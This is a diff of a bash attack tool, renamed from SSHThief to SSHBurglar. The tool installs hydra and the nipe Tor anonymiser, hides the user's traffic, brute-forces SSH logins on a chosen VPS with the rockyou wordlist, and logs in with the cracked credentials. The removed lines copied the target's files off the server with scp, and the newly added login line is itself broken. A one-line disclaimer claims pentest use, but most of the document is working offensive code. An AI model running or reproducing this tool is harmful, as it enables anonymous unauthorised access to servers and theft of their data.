@@ -1,12 +1,12 @@
 #!/bin/bash
 
-#######################
-### SSHTHIEF FUNCTIONS
-#######################
+#########################
+### SSHBURGLAR FUNCTIONS
+#########################
 
 # INSTALL(): automatically installs relevant applications on user host and creates relevant directories
-# ANON(): executes Nipe anonymiser and conducts an anonymity check
-# SSHCRACK(): collects user input for VPS address, executes a hydra brute-force attack and copies target system onto local host
+# ANON(): executes nipe anonymiser and conducts an anonymity check
+# SSHCRACK(): collects user input for VPS address, executes a hydra brute-force attack and accesses the vps
 
 #####################
 ### INSTALL FUNCTION
@@ -17,13 +17,13 @@
 function INSTALL()
 {
 	### START
-	# let the user know that SSHThief is starting
+	# let the user know that SSHBurglar is starting
 	echo " "
-	echo "[*] SSHThief is starting..."
+	echo "[*] SSHBurglar is starting..."
 	echo " "
 	echo "[*] Installing and updating applications on your local computer..."
 	echo " "
-	echo "[*] Creating new directory: ~/SSHThief..."
+	echo "[*] Creating new directory: ~/SSHBurglar..."
 	echo " "
 	
 	### APT UPDATE
@@ -35,19 +35,19 @@ function INSTALL()
 	### DIRECTORY
 	# create a directory to contain output files later
 	cd ~
-	mkdir SSHThief
-	cd ~/SSHThief
-	echo "[+] Directory created: ~/SSHThief"
+	mkdir SSHBurglar
+	cd ~/SSHBurglar
+	echo "[+] Directory created: ~/SSHBurglar"
 	echo " "
 	
   	### FIGLET INSTALLATION
 	# install figlet for aesthetic purposes
 	mkdir figrc
-	cd ~/SSHThief/figrc
+	cd ~/SSHBurglar/figrc
 	sudo apt-get -y install figlet
 	# install cybermedium figlet font; credits: http://www.figlet.org
 	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
-	cd ~/SSHThief
+	cd ~/SSHBurglar
 	
 	### CORE APPLICATIONS INSTALLATION
 	# install relevant applications
@@ -57,7 +57,7 @@ function INSTALL()
 	sudo apt-get -y install hydra
 	sudo apt-get install tor
 	git clone https://github.com/htrgouvea/nipe.git 
-	cd ~/SSHThief/nipe 
+	cd ~/SSHBurglar/nipe 
 	sudo cpan install Try:Tiny Config::Simple JSON
 	sudo perl nipe.pl install
 	
@@ -80,7 +80,7 @@ function SSHCRACK()
 {
 	### START
 	# display figlet for aesthetics, with short description of program
-	figlet -c -f ~/SSHThief/figrc/cybermedium.flf -t "SSHTHIEF"
+	figlet -c -f ~/SSHBurglar/figrc/cybermedium.flf -t "SSHBurglar"
 	echo " "
 	echo "[*] This program is for testing the basic network security of a VPS. Please use for penetration testing and education purposes only."
 	echo " "
@@ -89,11 +89,11 @@ function SSHCRACK()
 	
 	### VPS ADDRESS INPUT
 	read -p "[!] Enter VPS IP Address: " vpsip
-	cd ~/SSHThief
+	cd ~/SSHBurglar
 	mkdir $vpsip
-	cd ~/SSHThief/$vpsip
+	cd ~/SSHBurglar/$vpsip
 	echo " "
-	echo "[+] Directory created: ~/SSHThief/$vpsip"
+	echo "[+] Directory created: ~/SSHBurglar/$vpsip"
 	echo " "
 	
 	### WORDLIST CONFIGURATION
@@ -101,11 +101,11 @@ function SSHCRACK()
 	echo " "
 	cd /usr/share/wordlists
 	sudo gunzip rockyou.txt.gz
-	sudo cp rockyou.txt ~/SSHThief/$vpsip/wordlist.txt
-	cd ~/SSHThief/$vpsip
+	sudo cp rockyou.txt ~/SSHBurglar/$vpsip/wordlist.txt
+	cd ~/SSHBurglar/$vpsip
 	sudo sed -i '1i kali' wordlist.txt
-	WordList=~/SSHThief/$vpsip/wordlist.txt
-	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist.txt"
+	WordList=~/SSHBurglar/$vpsip/wordlist.txt
+	echo "[+] Wordlist created: ~/SSHBurglar/$vpsip/wordlist.txt"
 	echo " "
 	
 	### BRUTE-FORCE ATTACK
@@ -115,6 +115,7 @@ function SSHCRACK()
 	# if attack succeeds, select cracked user and call the SCP function
 	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
 	
+	### SUCCESSFUL ATTACK
 	if [ "$crackstatus" == "host:" ]
 	then
 		### DISPLAY OF CRACKED USERS
@@ -131,19 +132,10 @@ function SSHCRACK()
 		echo " "
 		echo "[*] Connecting to $vpsip now..."
 		
-		# SCP OF SYSTEM FILES
-		echo " "
-		echo "[+] Connected to $vpsip."
-		echo " "
-		echo "[*] Copying target file system..."
-		echo " "
-		sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/* ~/SSHThief/$vpsip 2> /dev/null
-		echo " "
-		echo "[+] Target file system has been copied onto the directory: ~/SSHThief/$vpsip/system"
+		### ACCESS
+		sshpass -p "$vpspass" "$vpsuser"@"$vpsip" 2> /dev/null
 	
-	### END
-	exit
-		
+	### UNSUCCESSFUL ATTACK
 	else
 		### EXIT
 		echo "[-] Attack unsuccessful. Exiting program now..."
@@ -166,7 +158,7 @@ function ANON()
 	
 	### ANONYMISATION
 	# execute nipe in nipe folder
-	cd ~/SSHThief/nipe
+	cd ~/SSHBurglar/nipe
 	sudo perl nipe.pl start
 	sudo perl nipe.pl stop
 	sudo perl nipe.pl start
@@ -176,6 +168,7 @@ function ANON()
 	# if nipestatus shows "activated", user is anonymous
 	nipestatus="$(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')"
 	
+	### SUCCESSFUL ANONYMISATION
 	if [ "$nipestatus" == "activated" ]
 	then
 		### PROCEED
@@ -184,7 +177,8 @@ function ANON()
 		echo " "
 		# after anonymity check, call the SSHCRACK function
 		SSHCRACK
-		
+	
+	### UNSUCCESSFUL ANONYMISATION
 	else
 		### EXIT
 		echo " "
